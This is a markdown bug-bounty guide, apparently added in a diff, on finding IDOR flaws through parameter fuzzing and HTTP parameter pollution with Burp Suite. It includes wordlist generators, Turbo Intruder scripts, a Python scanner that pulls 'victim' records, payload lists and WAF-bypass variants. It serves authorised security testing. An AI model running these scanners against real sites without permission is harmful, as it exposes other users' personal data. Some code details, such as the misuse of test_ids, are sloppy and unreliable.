+1. **Find base requests** containing IDs:
+   ```
+   /api/user/100
+   /profile?id=100
+   /download?file_id=100
+   ```
+
+2. **Document parameter patterns**:
+   - Original parameter: `id`, `user_id`, `documentId`
+   - Original value: Usually numeric, UUID, or string identifier
+
+---
+
+## 🔍 **PHASE 1: RECONNAISSANCE & PARAMETER DISCOVERY**
+
+### **Step 1.1: Spider the Application**
+1. **Configure scope**:
+   - Target → Scope → Add to scope
+   - Enable "Use advanced scope control"
+
+2. **Run active spider**:
+   - Right-click target → Spider → Spider this host
+   - Note all endpoints with parameters
+
+3. **Analyze sitemap**:
+   - Target → Sitemap
+   - Filter by parameters using search: `?` or `&`
+
+### **Step 1.2: Passive Parameter Discovery**
+1. **Use Param Miner extension**:
+   ```
+   Extensions → Param Miner → Start passive scan
+   Check: "Add to sitemap"
+   Enable: "Guess headers"
+   ```
+
+2. **Monitor Logger++**:
+   - Track all parameters seen
+   - Create regex patterns: `\b(id|uid|pid|doc|file)\b`
+
+3. **Create parameter wordlist**:
+   ```text
+   # Common prefixes
+   user_
+   account_
+   profile_
+   member_
+   customer_
+   client_
+   
+   # Common suffixes
+   _id
+   _uid
+   _guid
+   _number
+   _code
+   _ref
+   _reference
+   
+   # Combine variations
+   user_id
+   userId
+   UserID
+   UID
+   PID
+   ```
+
+### **Step 1.3: Dictionary Generation**
+Create comprehensive parameter wordlist:
+
+```python
+# Save as param_wordlist.py
+prefixes = ['', 'user', 'account', 'profile', 'member', 'customer', 'client', 
+            'person', 'individual', 'owner', 'creator', 'author', 'target',
+            'source', 'dest', 'from', 'to', 'recipient', 'sender', 'parent',
+            'child', 'related', 'linked', 'associated', 'primary', 'secondary']
+
+suffixes = ['id', 'uid', 'guid', 'uuid', 'number', 'code', 'ref', 'reference',
+            'key', 'token', 'hash', 'ident', 'identifier', 'param', 'parameter',
+            'value', 'data', 'info', 'record', 'entry', 'item', 'object']
+
+bases = ['id', 'uid', 'pid', 'sid', 'cid', 'uid', 'gid', 'rid', 'tid']
+
+# Generate combinations
+with open('param_wordlist.txt', 'w') as f:
+    # Prefix + base + suffix
+    for prefix in prefixes:
+        for base in bases:
+            for suffix in suffixes:
+                if prefix and suffix:
+                    f.write(f"{prefix}_{base}_{suffix}\n")
+                    f.write(f"{prefix}{base}{suffix}\n")
+                elif prefix:
+                    f.write(f"{prefix}_{base}\n")
+                    f.write(f"{prefix}{base}\n")
+                elif suffix:
+                    f.write(f"{base}_{suffix}\n")
+                    f.write(f"{base}{suffix}\n")
+    
+    # Case variations
+    common = ['userId', 'UserID', 'user-id', 'user_id', 'user.id',
+              'accountId', 'AccountID', 'account-id', 'account_id',
+              'profileId', 'ProfileID', 'profile-id', 'profile_id']
+    
+    for param in common:
+        f.write(f"{param}\n")
+```
+
+---
+
+## 🎯 **PHASE 2: ACTIVE PARAMETER FUZZING**
+
+### **Step 2.1: Setup Burp Intruder for Parameter Discovery**
+
+1. **Capture base request**:
+   ```
+   GET /api/profile?id=100 HTTP/1.1
+   Host: target.com
+   Cookie: session=xyz
+   ```
+
+2. **Prepare for parameter fuzzing**:
+   - Send to Intruder (Ctrl+I)
+   - Attack type: **Pitchfork** or **Sniper**
+
+3. **Configure payload positions**:
+   ```
+   GET /api/profile?§parameter§=100 HTTP/1.1
+   Host: target.com
+   Cookie: session=xyz
+   ```
+
+4. **Load payloads**:
+   - Payload set 1: Load `param_wordlist.txt`
+   - Enable: URL-encode these characters
+
+5. **Configure grep**:
+   - Add grep match: `"user"`, `"profile"`, `"data"`, `"success"`
+   - Add grep extract for response length
+
+6. **Resource pool**:
+   - Set threads: 5-10
+   - Add delay: 100-500ms
+
+### **Step 2.2: Advanced Parameter Discovery with Turbo Intruder**
+
+```python
+# Save as param_discovery.py for Turbo Intruder
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    
+    # Load parameter wordlist
+    with open('param_wordlist.txt', 'r') as f:
+        params = [line.strip() for line in f]
+    
+    # Base request template
+    template = f"""GET /api/profile?%s=100 HTTP/1.1
+Host: {target.host}
+Cookie: session=xyz
+Connection: close
+
+"""
+    
+    # Queue all requests
+    for param in params:
+        engine.queue(template % param)
+        
+        # Random delay to avoid rate limiting
+        time.sleep(random.uniform(0.1, 0.3))
+
+def handleResponse(req, interesting):
+    # Check for interesting responses
+    if '200 OK' in req.response:
+        print(f"Found parameter: {req.path}")
+        
+        # Check if response contains user data
+        if 'user' in req.response.lower():
+            print(f"  → Contains user data!")
+```
+
+### **Step 2.3: Response Analysis**
+
+1. **Sort by response length**:
+   - Intruder results → Length column
+   - Look for unusual lengths (different from baseline)
+
+2. **Check status codes**:
+   - 200 OK → Parameter accepted
+   - 400/500 → Parameter may be processed
+   - 403 → Parameter recognized but blocked
+
+3. **Content analysis**:
+   ```text
+   Baseline response (no parameter or wrong param):
+   {"error":"Missing parameter"}
+   
+   Interesting response:
+   {"user":{"id":100,"name":"victim","email":"victim@test.com"}}
+   ```
+
+4. **Time-based analysis**:
+   - Enable response time capture
+   - Longer times may indicate database queries
+   - Compare with baseline
+
+---
+
+## 🔬 **PHASE 3: VALIDATION & EXPLOITATION**
+
+### **Step 3.1: Validate Discovered Parameters**
+
+For each interesting parameter found:
+
+1. **Test with original user ID**:
+   ```
+   Original: /api/profile?id=100
+   New: /api/profile?user_id=100
+   ```
+
+2. **Compare responses**:
+   ```bash
+   # Using Burp Comparer
+   Select both requests → Right-click → Send to Comparer
+   Check for identical responses
+   ```
+
+3. **Test with victim ID**:
+   ```
+   /api/profile?user_id=101
+   ```
+
+4. **Document findings**:
+   ```text
+   Parameter: user_id
+   Original ID (100): Returned user 100 data ✓
+   Victim ID (101): Returned user 101 data ✗ (IDOR VULNERABLE)
+   ```
+
+### **Step 3.2: Automated Validation Script**
+
+```python
+# Using Burp Extender API or Python with requests
+import requests
+import json
+
+def validate_parameter(base_url, param_name, test_ids):
+    """
+    Validate if parameter is vulnerable to IDOR
+    """
+    results = {}
+    
+    for test_id in test_ids:
+        # Test with original user
+        params = {param_name: test_id}
+        
+        # Add original parameters if needed
+        if 'original_id' in test_ids:
+            params['id'] = test_ids['original_id']
+        
+        response = requests.get(
+            base_url,
+            params=params,
+            cookies={'session': 'your_session'},
+            headers={'User-Agent': 'Mozilla/5.0'}
+        )
+        
+        # Store response
+        results[test_id] = {
+            'status': response.status_code,
+            'length': len(response.text),
+            'content': response.text[:200]  # Preview
+        }
+        
+        # Check for user data
+        if 'email' in response.text or 'username' in response.text:
+            print(f"⚠️ Possible IDOR with {param_name}={test_id}")
+    
+    return results
+
+# Test IDs
+test_ids = {
+    'original_id': 100,  # Your ID
+    'victim_1': 101,     # Victim ID 1
+    'victim_2': 102,     # Victim ID 2
+    'invalid': 999999    # Invalid ID for baseline
+}
+
+# Run validation
+result = validate_parameter(
+    'https://target.com/api/profile',
+    'user_id',
+    test_ids
+)
+
+print(json.dumps(result, indent=2))
+```
+
+### **Step 3.3: Exploitation Scenarios**
+
+#### **Scenario A: Direct Data Access**
+```
+GET /api/profile?user_id=101
+Response includes:
+{
+  "id": 101,
+  "email": "victim@test.com",
+  "ssn": "123-45-6789",
+  "credit_card": "4111-1111-1111-1111"
+}
+```
+
+#### **Scenario B: Parameter Override**
+```
+# Original request with two parameters
+GET /api/profile?id=100&user_id=101
+
+# Server may use:
+# - First parameter: id=100
+# - Last parameter: user_id=101
+# - All parameters: check which overrides
+```
+
+#### **Scenario C: Chained Parameters**
+```
+GET /api/data?user=100&profile_id=101
+GET /api/data?account_id=100&user_ref=101
+```
+
+---
+
+## 🛡️ **PHASE 4: ADVANCED TESTING TECHNIQUES**
+
+### **Step 4.1: Parameter Pollution Testing**
+
+Test how the application handles multiple parameters:
+
+```python
+# Turbo Intruder script for parameter pollution
+def queueRequests(target, wordlists):
+    engine = RequestEngine(target, concurrentConnections=5)
+    
+    # Test different parameter combinations
+    combos = [
+        "id=100&user_id=101",
+        "user_id=101&id=100", 
+        "id=100&user_id=101&id=102",
+        "user_id[]=100&user_id[]=101",
+        "id=100&user-id=101",
+        "id=100&userId=101"
+    ]
+    
+    for combo in combos:
+        engine.queue(f"""GET /api/profile?{combo} HTTP/1.1
+Host: {target.host}
+Cookie: session=xyz
+
+""")
+```
+
+### **Step 4.2: Case Sensitivity Testing**
+
+```python
+# Generate case variations
+params = ['userid', 'userId', 'UserID', 'USERID', 
+          'user-id', 'User-Id', 'USER-ID', 'user.id']
+
+for param in params:
+    response = requests.get(
+        url,
+        params={param: 101},
+        cookies=sess
+    )
+    
+    if response.status_code == 200:
+        print(f"Case variation accepted: {param}")
+```
+
+### **Step 4.3: Encoding Bypass Testing**
+
+```python
+# Test URL-encoded variations
+import urllib.parse
+
+params = ['user id', 'user.id', 'user-id', 'user/id']
+for param in params:
+    encoded = urllib.parse.quote(param)
+    response = requests.get(
+        f"{url}?{encoded}=101",
+        cookies=sess
+    )
+```
+
+---
+
+## 📊 **PHASE 5: REPORTING & DOCUMENTATION**
+
+### **Step 5.1: Document Each Finding**
+
+```markdown
+## IDOR Vulnerability via Parameter Prefix/Suffix
+
+**Endpoint:** `https://target.com/api/profile`
+**Original Parameter:** `id` (value: 100)
+**Vulnerable Parameter:** `user_id` (value: 101)
+
+### Proof of Concept
+1. Original request (authorized):
+   ```
+   GET /api/profile?id=100
+   Response: User 100 data
+   ```
+
+2. Modified request (unauthorized):
+   ```
+   GET /api/profile?user_id=101
+   Response: User 101 data
+   ```
+
+### Impact
+- Access to other users' personal information
+- Data exposed: email, address, phone, SSN
+
+### Technical Details
+- Parameter accepts any numeric ID
+- No authorization check on `user_id` parameter
+- Response time: 234ms (similar to valid requests)
+
+### Reproduction Steps
+1. Login as user 100
+2. Capture request to `/api/profile`
+3. Add parameter `user_id=101`
+4. Observe response contains user 101 data
+```
+
+### **Step 5.2: Create Automation Script**
+
+```python
+#!/usr/bin/env python3
+"""
+IDOR Scanner for Parameter Prefix/Suffix
+Usage: python3 scan_idor.py -u https://target.com -c "session=xyz"
+"""
+
+import requests
+import argparse
+import json
+from concurrent.futures import ThreadPoolExecutor
+
+class IDORScanner:
+    def __init__(self, base_url, cookies, param_wordlist):
+        self.base_url = base_url
+        self.cookies = cookies
+        self.params = self.load_params(param_wordlist)
+        self.results = []
+        
+    def load_params(self, wordlist):
+        with open(wordlist, 'r') as f:
+            return [line.strip() for line in f]
+    
+    def test_parameter(self, param, original_id, victim_id):
+        """Test a single parameter for IDOR"""
+        result = {
+            'parameter': param,
+            'original_response': None,
+            'victim_response': None,
+            'vulnerable': False
+        }
+        
+        # Test with original ID
+        orig_resp = requests.get(
+            f"{self.base_url}?{param}={original_id}",
+            cookies=self.cookies
+        )
+        result['original_response'] = {
+            'status': orig_resp.status_code,
+            'length': len(orig_resp.text)
+        }
+        
+        # Test with victim ID
+        victim_resp = requests.get(
+            f"{self.base_url}?{param}={victim_id}",
+            cookies=self.cookies
+        )
+        result['victim_response'] = {
+            'status': victim_resp.status_code,
+            'length': len(victim_resp.text)
+        }
+        
+        # Check if vulnerable
+        if (victim_resp.status_code == 200 and 
+            len(victim_resp.text) > 100 and
+            'email' in victim_resp.text.lower()):
+            result['vulnerable'] = True
+            result['data_preview'] = victim_resp.text[:200]
+        
+        return result
+    
+    def scan(self, original_id, victim_id, threads=5):
+        """Scan all parameters"""
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = []
+            for param in self.params:
+                future = executor.submit(
+                    self.test_parameter, 
+                    param, original_id, victim_id
+                )
+                futures.append(future)
+            
+            for future in futures:
+                result = future.result()
+                if result['vulnerable']:
+                    self.results.append(result)
+                    print(f"⚠️ VULNERABLE: {result['parameter']}")
+        
+        return self.results
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', '--url', required=True)
+    parser.add_argument('-c', '--cookie', required=True)
+    parser.add_argument('-o', '--original', type=int, default=100)
+    parser.add_argument('-v', '--victim', type=int, default=101)
+    parser.add_argument('-w', '--wordlist', default='param_wordlist.txt')
+    
+    args = parser.parse_args()
+    
+    cookies = {}
+    for item in args.cookie.split(';'):
+        if '=' in item:
+            key, value = item.strip().split('=', 1)
+            cookies[key] = value
+    
+    scanner = IDORScanner(args.url, cookies, args.wordlist)
+    results = scanner.scan(args.original, args.victim)
+    
+    # Save results
+    with open('idor_results.json', 'w') as f:
+        json.dump(results, f, indent=2)
+    
+    print(f"\nScan complete! Found {len(results)} vulnerabilities.")
+    print("Results saved to idor_results.json")
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 🛠️ **BURP SUITE CONFIGURATION SUMMARY**
+
+### **Essential Settings**
+1. **Proxy → Options**:
+   - Enable "Intercept requests based on rules"
+   - Add rule: "Or URL is in target scope"
+
+2. **Intruder → Resource Pool**:
+   - Max concurrent requests: 5
+   - Delay between requests: 200ms
+
+3. **Project Options → Connections**:
+   - Timeout: 10 seconds
+   - Enable "Follow redirects"
+
+### **Key Extensions Required**
+1. **Param Miner** - For parameter discovery
+2. **Logger++** - For tracking all requests
+3. **Turbo Intruder** - For high-speed fuzzing
+4. **Hackvertor** - For encoding/decoding
+5. **Copy As Python-Requests** - For PoC generation
+
+---
+
+## ⚡ **QUICK CHECKLIST**
+
+- [ ] Identify all endpoints with parameters
+- [ ] Generate comprehensive parameter wordlist
+- [ ] Run Param Miner for passive discovery
+- [ ] Fuzz parameters with Intruder/Turbo Intruder
+- [ ] Analyze responses (length, status, content)
+- [ ] Validate findings with manual testing
+- [ ] Test parameter pollution scenarios
+- [ ] Check case sensitivity variations
+- [ ] Test URL-encoded variations
+- [ ] Document all vulnerable parameters
+- [ ] Create PoC scripts
+- [ ] Write detailed report
+
+---
+
+## 📚 **REFERENCES**
+- OWASP IDOR Testing Guide
+- PortSwigger Research on Parameter Discovery
+- Bug Bounty Methodology by @Jhaddix
+
+---
+
+# 🎯 **Bug #30: HTTP Parameter Pollution (HPP) IDOR - Complete Burp Suite Methodology**
+
+## 📋 **What is HTTP Parameter Pollution?**
+HPP occurs when an application receives multiple parameters with the same name. Different technologies handle this differently, which can lead to IDOR vulnerabilities.
+
+## 🔍 **DETECTION PHASE**
+
+### **Step 1: Identify Potential Endpoints**
+First, map all endpoints that accept parameters:
+
+```
+Burp Workflow:
+Target → Site Map → Filter by parameters
+Look for:
+- /api/user?id=123
+- /profile?user_id=456
+- /document?docId=789
+- /account?accountNumber=ABC123
+```
+
+### **Step 2: Manual Discovery Patterns**
+Test each identified endpoint with duplicate parameters:
+
+```http
+Original: GET /api/user?id=123
+
+Test variations:
+GET /api/user?id=123&id=456
+GET /api/user?user_id=123&user_id=456
+POST /api/user with body: id=123&id=456
+```
+
+## 🛠️ **BURP SUITE CONFIGURATION**
+
+### **Step 3: Set Up Burp Suite**
+
+```
+1. Proxy → Intercept → Turn interception ON
+2. Target → Scope → Add your target domain
+3. Repeater → Open for manual testing
+4. Intruder → Configure for automation
+```
+
+### **Step 4: Configure Burp Repeater for HPP Testing**
+
+**Template for testing:**
+```http
+GET /api/user?id=123&id=456 HTTP/1.1
+Host: target.com
+Cookie: session=YOUR_SESSION
+User-Agent: Mozilla/5.0
+Accept: application/json
+```
+
+## 🔬 **TESTING METHODOLOGY**
+
+### **Step 5: Systematic Parameter Testing**
+
+#### **Test Case 1: Basic Duplicate**
+```http
+# Original
+GET /api/user?id=100
+
+# Test
+GET /api/user?id=100&id=101
+GET /api/user?id=101&id=100
+GET /api/user?id=100&id=100&id=101
+```
+
+#### **Test Case 2: Different Locations**
+```http
+# URL + Body (for POST)
+POST /api/user?id=100 HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+id=101
+
+# Headers + URL
+GET /api/user?id=100 HTTP/1.1
+X-Original-ID: 101
+```
+
+#### **Test Case 3: Different Formats**
+```http
+# Array format
+GET /api/user?id[]=100&id[]=101
+
+# JSON format
+POST /api/user HTTP/1.1
+Content-Type: application/json
+
+{"id":100,"id":101}
+
+# XML format
+POST /api/user HTTP/1.1
+Content-Type: application/xml
+
+<user><id>100</id><id>101</id></user>
+```
+
+## 🤖 **AUTOMATED TESTING WITH BURP INTRUDER**
+
+### **Step 6: Configure Intruder Attack**
+
+```
+1. Send request to Intruder (Ctrl+I)
+2. Positions tab → Clear §
+3. Highlight parameter value → Add §
+4. Example: id=§100§&id=§101§
+```
+
+### **Step 7: Payload Sets Configuration**
+
+**Payload Set 1 (First ID):**
+```
+100 (your ID)
+0
+-1
+999999
+null
+```
+
+**Payload Set 2 (Second ID):**
+```
+101 (victim ID)
+102
+103
+104
+105
+```
+
+### **Step 8: Attack Types**
+
+#### **Sniper Attack** - Test single parameter variations
+```
+Positions: id=§100§&id=101
+Payloads: [101,102,103,104]
+```
+
+#### **Battering Ram** - Same payload in both positions
+```
+Positions: id=§100§&id=§100§
+Payloads: [101,102,103,104]
+```
+
+#### **Pitchfork** - Pair specific combinations
+```
+Positions: id=§100§&id=§101§
+Payload Set 1: [100,100,100]
+Payload Set 2: [101,102,103]
+```
+
+#### **Cluster Bomb** - Test all combinations
+```
+Positions: id=§100§&id=§101§
+Payload Set 1: [100,101,102]
+Payload Set 2: [200,201,202]
+Total requests: 3×3 = 9
+```
+
+## 🎯 **ADVANCED TESTING TECHNIQUES**
+
+### **Step 9: Server Behavior Fingerprinting**
+
+Test to identify how the server handles duplicates:
+
+```http
+# Test 1: Last parameter wins
+GET /api/user?id=100&id=101
+Response shows user 101 → Last parameter wins
+
+# Test 2: First parameter wins
+GET /api/user?id=100&id=101
+Response shows user 100 → First parameter wins
+
+# Test 3: Concatenation
+GET /api/user?id=100&id=101
+Response shows "100,101" → Parameters concatenated
+
+# Test 4: Array
+GET /api/user?id[]=100&id[]=101
+Response shows [100,101] → Array format
+```
+
+### **Step 10: Parameter Pollution + Other Techniques**
+
+#### **With Case Manipulation**
+```http
+GET /api/user?id=100&ID=101
+GET /api/user?Id=100&id=101
+GET /api/user?USER_ID=100&user_id=101
+```
+
+#### **With Encoding**
+```http
+GET /api/user?id=100&id=%31%30%31
+GET /api/user?id=100&id=101%00
+GET /api/user?id=100&id=101%20
+```
+
+#### **With Special Characters**
+```http
+GET /api/user?id=100&id=101'
+GET /api/user?id=100&id=101--
+GET /api/user?id=100&id=101;
+```
+
+## 📊 **RESPONSE ANALYSIS**
+
+### **Step 11: What to Look For**
+
+```python
+# Response Analysis Checklist
+1. Status Code Changes:
+   - 200 → 403 indicates security check
+   - 200 → 200 with different data = IDOR!
+   - 404 → 200 indicates info disclosure
+
+2. Content Differences:
+   - Different username appears
+   - Different email addresses
+   - Different profile data
+   - Different document content
+
+3. Error Messages:
+   - SQL errors (indicates injection)
+   - Path disclosure
+   - Stack traces
+   - "Multiple values not allowed"
+```
+
+### **Step 12: Response Comparison**
+
+**Use Burp Comparer:**
+```
+1. Select two responses
+2. Right-click → Send to Comparer
+3. Compare word-by-word or byte-by-byte
+4. Look for:
+   - Different user data
+   - Different permissions
+   - Hidden fields
+   - Tokens
+```
+
+## 🚀 **ADVANCED SCENARIOS**
+
+### **Scenario 1: REST API Testing**
+```http
+# Test different HTTP methods
+GET /api/users/100
+GET /api/users/100&id=101
+POST /api/users/100?access=admin&id=101
+PUT /api/users/100 with body: {"id":101}
+DELETE /api/users/100&id=101
+```
+
+### **Scenario 2: GraphQL Testing**
+```graphql
+# Original query
+query {
+  user(id: 100) {
+    name
+    email
+  }
+}
+
+# HPP test
+query {
+  user(id: 100, id: 101) {
+    name
+    email
+  }
+}
+```
+
+### **Scenario 3: File Upload/Download**
+```http
+# File download with HPP
+GET /download?file=doc100.pdf&file=doc101.pdf
+
+# File upload with HPP
+POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=xxx
+
+--xxx
+Content-Disposition: form-data; name="file"
+
+doc100.pdf
+--xxx
+Content-Disposition: form-data; name="file"
+
+doc101.pdf
+--xxx--
+```
+
+## 🛡️ **BYPASSING PROTECTIONS**
+
+### **Technique 1: WAF Bypass**
+```http
+# Instead of:
+id=100&id=101
+
+# Try:
+id=100&id=101&id=100
+id=100&id=101&id=101
+id=100&id=101&id=102
+id=100&id=101&id=100&id=101
+```
+
+### **Technique 2: Parameter Wrapping**
+```http
+# Original parameter name variations
+user[id]=100&user[id]=101
+data[user][id]=100&data[user][id]=101
+attributes[user_id]=100&attributes[user_id]=101
+```
+
+### **Technique 3: Mixing Formats**
+```http
+POST /api/user?id=100&id=101 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-API-Format: json
+
+{"id":102,"id":103}
+```
+
+## 📈 **BURP EXTENSIONS FOR HPP**
+
+### **Recommended Extensions:**
+
+1. **Param Miner** - Discover hidden parameters
+   ```
+   Right-click → Extensions → Param Miner
+   → "Guess params" or "Guess headers"
+   ```
+
+2. **HTTP Request Smuggler** - Test request handling
+   ```
+   Detect how server processes multiple parameters
+   ```
+
+3. **Turbo Intruder** - High-speed testing
+   ```python
+   def queueRequests(target, wordlists):
+       engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=10)
+       
+       for first in range(100, 200):
+           for second in range(100, 200):
+               engine.queue(target.req, [
+                   str(first),
+                   str(second)
+               ])
+   ```
+
+## 📝 **DOCUMENTATION TEMPLATE**
+
+When you find a working HPP IDOR, document it:
+
+```markdown
+# IDOR via HTTP Parameter Pollution
+
+## Vulnerability Details
+- **Endpoint:** https://target.com/api/user
+- **Method:** GET
+- **Parameter:** id (duplicate)
+- **Server Behavior:** Last parameter wins
+
+## Proof of Concept
+Original Request (my data):
+GET /api/user?id=100
+Response: {"user":"myuser","email":"me@test.com"}
+
+Exploit Request (victim's data):
+GET /api/user?id=100&id=101
+Response: {"user":"victim","email":"victim@test.com"}
+
+## Impact
+- Unauthorized access to victim's profile
+- Data exposure: email, personal info
+- Potential account takeover
+
+## Steps to Reproduce
+1. Log in as user 100
+2. Send request with duplicate id parameter
+3. Observe victim's data returned
+
+## Remediation
+- Validate only one parameter instance
+- Implement server-side authorization
+- Use CSRF tokens
+```
+
+## 🔧 **AUTOMATION SCRIPT USING BURP API**
+
+```python
+# Python script using Burp API for HPP testing
+from burp import IBurpExtender, IIntruderPayloadGenerator
+from java.util import List, ArrayList
+import random
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("HPP IDOR Generator")
+        
+    def generatePayloads(self, base_value, base_ids):
+        # Generate HPP payloads
+        payloads = ArrayList()
+        
+        victim_ids = [101, 102, 103, 104, 105]
+        
+        for victim_id in victim_ids:
+            # Format: original_id&victim_id
+            payload = "{}&{}".format(base_value, victim_id)
+            payloads.add(payload)
+            
+            # Format: victim_id&original_id
+            payload = "{}&{}".format(victim_id, base_value)
+            payloads.add(payload)
+            
+            # Format with multiple duplicates
+            payload = "{}&{}&{}&{}".format(
+                base_value, victim_id, base_value, victim_id
+            )
+            payloads.add(payload)
+            
+        return payloads
+```
+
+## ✅ **FINAL CHECKLIST**
+
+```
+[ ] Map all endpoints with parameters
+[ ] Identify parameter handling behavior
+[ ] Test basic duplicate parameters
+[ ] Test different locations (URL, body, headers)
+[ ] Test different formats (JSON, XML, form)
+[ ] Use Intruder for automation
+[ ] Analyze responses for IDOR
+[ ] Chain with other techniques
+[ ] Document findings
+[ ] Create proof of concept
+[ ] Test in different user contexts
+[ ] Verify impact
+[ ] Report responsibly
+```
+
+## ⚠️ **PRACTICE LABS**
+
+Set up local testing environment:
+
+```bash
+# Docker command for vulnerable app
+docker run -d -p 80:80 vulnerables/web-dvwa
+
+# Or use PortSwigger labs
+# https://portswigger.net/web-security/access-control/lab-idor-via-parameter-pollution
+```
+
+---
+
+## 🎯 **PRO TIPS**
+
+1. **Always test with two different accounts** to confirm IDOR
+2. **Use Burp Compare** for response analysis
+3. **Monitor response times** - might indicate different processing
+4. **Check JavaScript files** for hidden parameters
+5. **Test through proxies** to see actual server handling
+6. **Document every step** for reproducible findings
+
+Remember: HPP-based IDOR can be subtle. Always verify findings manually and document the exact behavior for your report!
